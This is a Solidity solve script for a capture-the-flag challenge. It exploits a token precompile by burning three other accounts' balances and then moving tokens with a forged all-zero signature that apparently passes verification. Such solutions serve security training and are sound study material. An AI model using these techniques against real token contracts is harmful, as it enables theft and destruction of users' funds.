// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "src/Precompile20.sol";

contract Solve is CTFSolver {
    function solve(address _challenge, address player) internal override {
        Challenge challenge = Challenge(_challenge);
        Precompile20 precompile20 = challenge.precompile20();

        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        address carl = address(0xCA1);

        precompile20.burnTokens(alice, 1 ether);
        precompile20.burnTokens(bob, 1 ether);
        precompile20.burnTokens(carl, 1 ether);

        bytes memory invalidSig = abi.encode(uint8(27), bytes32(0), bytes32(0));
        precompile20.transferTokens(3 ether, invalidSig);
    }
}
